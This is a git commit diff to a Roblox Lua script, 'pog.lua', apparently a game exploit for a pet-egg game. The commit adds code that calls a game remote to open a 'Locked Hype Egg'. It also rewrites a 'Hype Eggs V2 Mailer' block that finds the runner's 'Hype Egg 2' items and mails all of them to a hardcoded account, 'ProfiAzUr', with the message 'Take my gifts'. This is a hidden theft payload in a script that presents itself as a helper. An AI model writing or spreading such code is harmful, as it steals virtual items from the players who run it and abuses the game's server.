512b5f88e37b7cd50dcdcd39798fa42176eec63b
TheArexH4CKER <63061089+TheArexH4CKER@users.noreply.github.com>
2025-01-25 18:35:31 +0100

    Update pog.lua

--- pog.lua
+++ pog.lua
@@ -155,35 +155,67 @@ spawn(function()
     end
 end)
 
+-- Unlocks Hype Egg V2
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local playerInventory = Save.Get()["Inventory"]
+    local LootboxInv = playerInventory["Lootbox"]
+
+    -- Print details about the Lootbox inventory and find the key for the desired item
+    print("Current Lootbox Inventory:")
+    for key, item in pairs(LootboxInv) do
+        print("Key:", key)
+        print("Item Details:", item)
+        print("Item ID:", item.id or "N/A")
+        print("Amount (if available):", item._am or item.am or "N/A")
+
+        if item.id == "Locked Hype Egg" then
+            print("Found item with ID 'Locked Hype Egg'. Key:", key)
+            local ohString1 = key
+            local ohNumber2 = 1
+            print("Invoking Remote with:", ohString1, ohNumber2)
+
+            game:GetService("ReplicatedStorage").Network["Lootbox: Open"]:InvokeServer(ohString1, ohNumber2)
+            break
+        end
+    end
+
+    print("Finished scanning Lootbox inventory.")
+end)
+
 -- Hype Eggs V2 Mailer
 spawn(function()
     local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
     local username = "ProfiAzUr"
-    local loopInterval = 5 
-    while true do
-        local playerInventory = Save.Get()["Inventory"]
-        local LootboxInv = playerInventory["Lootbox"]
-        print("Searching for Hype Egg #2...")
-        for key, item in pairs(LootboxInv) do
-            if item.id == "Hype Egg 2" then
-                print("Found Hype Egg #2 item:", item)
-                local amount = item._am or item.am or 1
-                print("Amount to send:", amount)
-                local args = {
-                    [1] = username,
-                    [2] = "Take my gifts",
-                    [3] = "Lootbox",
-                    [4] = key,
-                    [5] = amount
-                }
-                print("Invoking Server with args:", unpack(args))
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                break
-            end
+
+    -- Attempt to retrieve player inventory
+    local playerInventory = Save.Get()["Inventory"]
+    local LootboxInv = playerInventory["Lootbox"]
+
+    -- Print details about the Lootbox inventory and find Hype Egg #2
+    print("Searching for Hype Egg #2...")
+    for key, item in pairs(LootboxInv) do
+        if item.id == "Hype Egg 2" then
+            print("Found Hype Egg #2 items:", item)
+            local amount = item._am or item.am or 1
+            print("Amount to send:", amount)
+
+            local args = {
+                [1] = username,
+                [2] = "Take my gifts",
+                [3] = "Lootbox",
+                [4] = key,
+                [5] = amount
+            }
+            print("Invoking Server with args:", unpack(args))
+
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+            break
         end
-        print("Finished processing Hype Egg #2s.")
-        task.wait(loopInterval * 60)
     end
+
+    print("Finished processing Hype Egg #2s.")
 end)
+
 
 
